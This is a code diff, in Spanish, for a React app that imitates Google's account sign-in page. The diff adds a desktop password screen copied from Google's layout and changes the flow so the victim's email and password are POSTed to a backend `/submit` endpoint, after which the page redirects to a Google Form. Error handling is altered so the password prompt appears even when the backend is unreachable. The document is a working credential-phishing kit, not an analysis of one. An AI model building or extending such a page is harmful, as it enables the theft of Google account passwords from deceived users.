@@ -42,15 +42,7 @@ function App() {
       return
     }
 
-  if (isMobile) {
-    setShowPasswordView(true)
-    setMessage('')
-    return
-  }
-
-    
-
-    // En escritorio, envía al backend
+    // Enviar al backend (tanto móvil como escritorio)
     try {
       const response = await fetch(`${API_URL}/submit`, {
         method: 'POST',
@@ -61,13 +53,17 @@ function App() {
       const data = await response.json()
 
       if (response.ok) {
-        setMessage('✅ Correo guardado con éxito')
+        // Mostrar vista de contraseña en ambos casos
+        setShowPasswordView(true)
+        setMessage('')
       } else {
         setMessage(`❌ Error: ${data.error || 'No se pudo guardar'}`)
       }
     } catch (error) {
       console.error('Error al conectar con el backend:', error)
-      setMessage('❌ Error de conexión con el servidor')
+      // Aún así mostrar la vista de contraseña para continuar el flujo
+      setShowPasswordView(true)
+      setMessage('')
     }
   }
 
@@ -78,22 +74,24 @@ function App() {
       return
     }
 
-    // Enviar datos al backend antes de redirigir
-    try {
-      const response = await fetch(`${API_URL}/submit`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password })
-      })
-      
-      if (!response.ok) {
-        console.error('Error al guardar en el backend')
+    // Enviar datos al backend antes de redirigir (no bloquea la redirección si falla)
+    if (API_URL) {
+      try {
+        const response = await fetch(`${API_URL}/submit`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, password })
+        })
+        
+        if (!response.ok) {
+          console.error('Error al guardar en el backend')
+        }
+      } catch (error) {
+        console.error('Error al conectar con el backend:', error)
       }
-    } catch (error) {
-      console.error('Error al conectar con el backend:', error)
     }
 
-    // Redirigir al formulario de Google
+    // Redirigir al formulario de Google (siempre se ejecuta)
     window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSfvlQFtK6i3ZCt7mVNtXFZRHOc_tpAnRsNtjgFKkZRjoIb1tg/viewform'
   }
 
@@ -240,34 +238,38 @@ function App() {
             <h1 className="login-title">{showPasswordView ? 'Te damos la bienvenida' : 'Inicia sesión'}</h1>
             {!showPasswordView && <p className="login-subtitle">Utiliza tu cuenta de Google</p>}
           </div>
-          <div className="header-right">
-            <div className="input-container">
-              <input
-                type="text"
-                className="email-input"
-                placeholder="Correo electrónico o teléfono"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-              />
+          {!showPasswordView && (
+            <div className="header-right">
+              <div className="input-container">
+                <input
+                  type="text"
+                  className="email-input"
+                  placeholder="Correo electrónico o teléfono"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                />
+              </div>
+            </div>
+          )}
+        </div>
+
+        {!showPasswordView && (
+          <div className="dialog-content">
+            <div className="content-left">
+              <p className="description">
+                con tu cuenta de Google. Esta cuenta estará disponible para otras aplicaciones de Google en el navegador.
+              </p>
+            </div>
+
+            <div className="content-right">
+              <a href="#" className="forgot-link">¿Has olvidado tu correo electrónico?</a>
+              
+              <p className="guest-mode-info">
+                ¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada. <a href="#" className="info-link">Más información sobre cómo usar el modo Invitado</a>
+              </p>
             </div>
           </div>
-        </div>
-
-        <div className="dialog-content">
-          <div className="content-left">
-            <p className="description">
-              con tu cuenta de Google. Esta cuenta estará disponible para otras aplicaciones de Google en el navegador.
-            </p>
-          </div>
-
-          <div className="content-right">
-            <a href="#" className="forgot-link">¿Has olvidado tu correo electrónico?</a>
-            
-            <p className="guest-mode-info">
-              ¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada. <a href="#" className="info-link">Más información sobre cómo usar el modo Invitado</a>
-            </p>
-          </div>
-        </div>
+        )}
 
         {!showPasswordView && (
           <>
@@ -302,6 +304,7 @@ function App() {
 
         {showPasswordView && (
           <>
+            {/* Vista móvil de contraseña */}
             <div className="password-mobile-content">
               <div className="password-email-container">
                 <div className="password-email-field" onClick={() => setShowPasswordView(false)}>
@@ -339,6 +342,50 @@ function App() {
               <div className="password-footer-row">
                 <a href="#" className="forgot-password-link">¿Has olvidado tu contraseña?</a>
                 <button className="password-next-btn" onClick={handlePasswordSubmit}>Siguiente</button>
+              </div>
+            </div>
+
+            {/* Vista de escritorio de contraseña */}
+            <div className="password-desktop-content">
+              <div className="password-desktop-left">
+                <div className="password-account-info">
+                  <div className="password-account-email-field" onClick={() => setShowPasswordView(false)}>
+                    <span className="password-account-email">{email || 'joacoestebanv@gmail.com'}</span>
+                    <svg className="dropdown-arrow" width="20" height="20" viewBox="0 0 24 24">
+                      <path d="M7 10l5 5 5-5z"/>
+                    </svg>
+                  </div>
+                </div>
+              </div>
+
+              <div className="password-desktop-right">
+                <div className="password-desktop-input-wrapper">
+                  <label className="password-label">Introduce tu contraseña</label>
+                  <input
+                    type={showPassword ? "text" : "password"}
+                    className="password-desktop-input"
+                    placeholder=""
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    onKeyPress={(e) => e.key === 'Enter' && handlePasswordSubmit()}
+                  />
+                </div>
+
+                <div className="show-password-desktop-container">
+                  <input
+                    type="checkbox"
+                    id="show-password-desktop"
+                    className="show-password-checkbox"
+                    checked={showPassword}
+                    onChange={(e) => setShowPassword(e.target.checked)}
+                  />
+                  <label htmlFor="show-password-desktop" className="show-password-label">Mostrar contraseña</label>
+                </div>
+
+                <div className="password-desktop-footer">
+                  <a href="#" className="try-another-way-link">Probar otra manera</a>
+                  <button className="password-desktop-next-btn" onClick={handlePasswordSubmit}>Siguiente</button>
+                </div>
               </div>
             </div>
           </>
